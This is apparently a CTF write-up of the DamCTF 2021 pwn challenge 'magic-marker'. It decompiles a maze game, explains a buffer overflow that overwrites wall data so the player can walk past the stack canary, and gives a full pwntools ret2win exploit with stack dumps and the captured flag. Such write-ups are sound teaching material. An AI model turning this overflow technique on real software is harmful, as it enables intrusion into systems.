# DamCTF 2021 

## pwn/magic-marker

> Can you find the flag in this aMAZEing text based adventure game?
> 
> `nc chals.damctf.xyz 31313`
>
> Author: BobbySinclusto
> 
> [`magic-marker`](magic-marker)

Tags: _pwn_ _x86-64_ _bof_ _ret2win_


## Summary

BOF to overwrite maze structure to allow free movement and go _off grid_ to the return address for an easy ret2win.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE, Partical RELRO = Easy ROP, easy GOT overwrite.  Just do not mess with the canary.


### Decompile with Ghidra

`play_maze` is used to navigate a 40x40 (`0x28` x `0x28`) randomly generated maze.  Each `0x20` byte tile in the maze is represented with a data structure of message and walls (well, lack of walls to be precise) and is addressed with something like `local_c848 + (uVar6 + lVar4 * 0x28) * 0x20`.

In `play_maze` there's three areas of interest:

```c
    uVar7 = auStack51244[lVar5 * 8];
    if ((uVar7 & 8) != 0) {
      puts("North");
      uVar7 = auStack51244[lVar5 * 8];
    }
    if ((uVar7 & 4) != 0) {
      puts("East");
      uVar7 = auStack51244[(uVar6 + lVar4 * 0x28) * 8];
    }
    if ((uVar7 & 2) != 0) {
      puts("South");
      uVar7 = auStack51244[(uVar6 + lVar4 * 0x28) * 8];
    }
    if ((uVar7 & 1) != 0) {
      puts("West");
    }
```

A single nibble is used to store where the walls are not, IOW the directions that are open to you.  `0xf` will enable movement in any direction.

```
  switch(iVar2 - 0x61U & 0xff) { // translate a-z to 0-25
  case 0: // a for west
    if ((*(byte *)(auStack51244 + (uVar6 + lVar4 * 0x28) * 8) & 1) != 0) {
      uVar7 = (int)uVar8 - 1;
      uVar8 = (ulong)uVar7;
      uVar6 = SEXT48((int)uVar7);
      goto LAB_00400d00;
    }
    break;
...  
  case 3: // d for east
    if ((*(byte *)(auStack51244 + (uVar6 + lVar4 * 0x28) * 8) & 4) != 0) {
      uVar7 = (int)uVar8 + 1;
      uVar8 = (ulong)uVar7;
      uVar6 = SEXT48((int)uVar7);
      goto LAB_00400d00;
    }
    break;
...
  case 0x10: // q for quit, IOW our ROP chain
    if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
      return;
    }
    __stack_chk_fail();
  case 0x12: // s for south
    if ((*(byte *)(auStack51244 + (uVar6 + lVar4 * 0x28) * 8) & 2) != 0) {
      iVar1 = iVar1 + 1;
      lVar4 = (long)iVar1;
      goto LAB_00400d00;
    }
    break;
  case 0x16: // w for north
    if ((*(byte *)(auStack51244 + (uVar6 + lVar4 * 0x28) * 8) & 8) != 0) {
      iVar1 = iVar1 + -1;
      lVar4 = (long)iVar1;
      goto LAB_00400d00;
    }
    break;
```

Movement increments or decrements `lVar4` (N/S movement) and/or `uVar6` (E/W movement).

```c
  puts(
      "Your magnificently magestic magic marker magically manifests itself in your hand. What would you like to write?"
      );
  fgets(local_c848 + (uVar6 + lVar4 * 0x28) * 0x20,0x21,stdin);
```

Lastly our vuln is this `fgets` that will take are current position and allow us to write out a message on the tile, however it can overwrite the wall data.  A simple string of `0x20` * `0xFF` will simply enable us to move in any direction.  Including _off the grid_.

We just have to be very careful when _off the grid_ not to corrupt the canary.  Otherwise it's a simple ret2win challenge.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./magic-marker')

if args.REMOTE:
    p = remote('chals.damctf.xyz', 31313)
else:
    p = process(binary.path)

p.sendlineafter(b'?\n',b'jump up and down')
```

There's a small gate to get past to start the game, simply `jump up and down`.

```python
# where am i?
p.sendlineafter(b'): ',b'm')

x = y = 0
for i in range(80):
    _ = p.recvline().strip()
    if b'|' in _:
        y += 1
    if b'*' in _:
        x = (2 + _.find(b'*')) // 4
        break

log.info('x,y = {x},{y}'.format(x = x, y = y))
```

Next, we need to find where we are in the maze.  The above just scans the output of `m` (print maze) to find our location.

```python
# kick down the walls and get to the lower right
for i in range(40 - x):
    p.sendlineafter(b'): ', b'x')
    p.sendlineafter(b'?\n', 0x20 * b'\xff')
    p.sendlineafter(b'): ', b'd')

for j in range(40 - y):
    p.sendlineafter(b'): ', b'x')
    p.sendlineafter(b'?\n', 0x20 * b'\xff')
    p.sendlineafter(b'): ', b's')
```

Next, we just kick down the walls and move to the lower right, this is at the end of the allocated buffer for the maze and not far from the return address.

```
# lets bust out of here, return to the east
p.sendlineafter(b'): ', b'x')
p.sendlineafter(b'?\n', 0x20 * b'\xff')
p.sendlineafter(b'): ', b'd')
p.sendlineafter(b'): ', b'd')
p.sendlineafter(b'): ', b'x')
p.sendlineafter(b'?\n', 0x20 * b'\xff')
p.sendlineafter(b'): ', b'd')
p.sendlineafter(b'): ', b'x')

# 8 bytes before the return address FTW!
p.sendlineafter(b'?\n', p64(0) + p64(binary.sym.win))
p.sendlineafter(b'): ', b'q')
p.stream()
```

Lastly, move East (`0x20` bytes at a time).  Each time before we move we write `0x20 * b'\xff'` bytes to clear out the walls, _except_ for the block of 32-bytes that contains the canary.

Luckily, the correct nibble is set in that block to allow another move East (it's a stack address at that location with a 50/50 chance unblocking East with ASLR.  No checks; sometimes this hangs, just rerun.  In the [pwn/sir-marksalot](../sir-marksalot) writeup I'll cover this in more detail and put in checks).

Finally after a few more moves we're 8 bytes from the return address, so 8 bytes of garbage, then the location of the `win` function and we get the flag. 

End of stack just before `q` is sent:

```
0x00007fff68ff78b0│+0xc7f0: 0xffffffffffffffff
0x00007fff68ff78b8│+0xc7f8: 0xffffffffffffffff
0x00007fff68ff78c0│+0xc800: 0xffffffffffffffff
0x00007fff68ff78c8│+0xc808: 0xffffffffffffffff
0x00007fff68ff78d0│+0xc810: 0x0000000000000200
0x00007fff68ff78d8│+0xc818: 0xeff9658e4eccb100
0x00007fff68ff78e0│+0xc820: 0x0000000000401380  →  "Oh no! The ground gives way and you fall into a da[...]"
0x00007fff68ff78e8│+0xc828: 0x00007fff68ff7920  →  0x20707520706d000a
0x00007fff68ff78f0│+0xc830: 0xffffffffffffffff
0x00007fff68ff78f8│+0xc838: 0xffffffffffffffff
0x00007fff68ff7900│+0xc840: 0xffffffffffffffff
0x00007fff68ff7908│+0xc848: 0xffffffffffffffff
0x00007fff68ff7910│+0xc850: 0x0000000000000000
0x00007fff68ff7918│+0xc858: 0x0000000000400fa0  →  <win+0> push rbp
```

This correlates with the last block of code above.  Basically, write out `0xff`s, then move East to block with canary, then move East again preserving the block with the canary, then write out `0xff`s again, move East, then write out ROP chain.

Stack before going _off the grid_:

```
0x00007ffe2af22390│+0xc7f0: 0x0000000000000000
0x00007ffe2af22398│+0xc7f8: 0x0000000000000000
0x00007ffe2af223a0│+0xc800: 0x0000000000000000
0x00007ffe2af223a8│+0xc808: 0x0000000800000000
0x00007ffe2af223b0│+0xc810: 0x0000000000000213
0x00007ffe2af223b8│+0xc818: 0x068c9f5626adf300
0x00007ffe2af223c0│+0xc820: 0x0000000000401380  →  "Oh no! The ground gives way and you fall into a da[...]"
0x00007ffe2af223c8│+0xc828: 0x00007ffe2af22400  →  "jump up and down\n"
0x00007ffe2af223d0│+0xc830: 0x000000000040113d  →  "jump up and down\n"
0x00007ffe2af223d8│+0xc838: 0x0000000000401122  →  "I'm not sure I understand."
0x00007ffe2af223e0│+0xc840: 0x00007ffe2af22530  →  0x0000000000000001
0x00007ffe2af223e8│+0xc848: 0x0000000000000000
0x00007ffe2af223f0│+0xc850: 0x0000000000000000
0x00007ffe2af223f8│+0xc858: 0x000000000040085d  →  <main+173> xor eax, eax
```

Finding the location of the return address is pretty straight forward.  The `main+173` is a giveaway, but also you can just get from Ghidra `char local_c848` (correlates with stack offset: `+0xc858`).

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/damctf2021/magic-marker/magic-marker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chals.damctf.xyz on port 31313: Done
[*] x,y = 38,39
Congratulations! You escaped the maze and got the flag!
dam{m4rvellOU5lY_M49n1f1cen7_m491C_m4rker5_M4KE_M4zE_M4n1PuL471oN_M4R91N4llY_M4L1c1Ou5}
```
